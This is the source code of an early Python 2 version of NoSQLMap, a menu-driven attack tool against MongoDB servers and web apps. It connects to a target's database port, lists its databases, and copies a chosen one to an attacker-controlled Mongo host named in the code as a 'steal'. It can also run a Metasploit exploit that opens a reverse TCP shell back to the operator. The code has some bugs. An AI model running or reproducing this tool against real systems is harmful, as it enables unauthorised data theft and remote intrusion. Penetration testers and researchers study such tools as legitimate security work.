#!/usr/bin/python

import sys
import string
import random
import os
import httplib2
import urllib
import pymongo
from subprocess import call



def mainMenu():
	select = True
	while select:
		os.system('clear')
		print "NoSQLMap v0.01-by Russell Butturini(tcstool@gmail.com)"
		print "\n"
		print "1-Set options (do this first)"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			options()

		elif select == "2":
			netAttacks(victim)
		
		elif select == "3":
			webApps()

		elif select == "4":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global victim
	global webPort
	global uri
	global httpMethod
	global myIP
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP"
		print "2-Set web app port"
		print "3-Set URI Path"
		print "4-Set HTTP Request Method (GET/POST)"
		print "5-Set my local Mongo/Shell IP"
		print "6-Set shell listener port"
		print "7-Back to main menu"

		select = raw_input("Select an option:")
		
		if select == "1":
			victim = raw_input("Enter the host IP/DNS name: ")
			print "Target set to " + victim + "\n"
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps:")
			print "HTTP port set to " + webPort + "\n"
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI:")
			print "URI Path set to " + uri + "\n"
			options()

		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					options()

				elif httpMethod == "2":
					print "POST request set"
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
			print "Shell IP set to " + myIP + "\n"
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			options()
			
		elif select == "7":
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	global dbList
	
	try:
		conn = pymongo.MongoClient(target,27017)
		print "MongoDB port open on " + target + ":27017!"
		mgtOpen = True
	
	except:
		print "MongoDB port closed."
		
		
	mgtUrl = "http://" + target + ":28017"
	mgtRespCode = urllib.urlopen(mgtUrl).getcode()
	
	try:	
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
	
		else:
			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
	except:
		print "MongoDB web management closed."
	
	if mgtOpen == True:

		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"

		print "List of databases:"
		dbList = conn.database_names()
		print "\n".join(dbList)

		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
		
		if getShell == "y" or getShell == "Y":
			try:
				call["msfcli","exploit/linux/misc/mongod_native_helper","RHOST=" + victim,"DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=" + myIP, "LPORT="+ myPort, "E" ]
			
			except:
				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
	
	raw_input("Press enter to continue...")
	return()
		
	
	
def webApps():
	print "Checking to see if web server at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) #+ str(uri)
	appRespCode = urllib.urlopen(appURL).getcode()
	
	try:
		if appRespCode == 200:
			print "App is up, starting injection test."
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		
		print "Injecting " + injectString + " for baseline response size..."
	
	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	chars = string.ascii_letters + string.digits
	return ''.join(random.choice(chars) for x in range(size))
	
	
	
	

def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		myDBConn = pymongo.MongoClient(myDB,27017)
		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",host)	
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		print "Something went wrong.  Are you sure your MongoDB is running?"
		stealDBs(myDB)								
	
mainMenu()
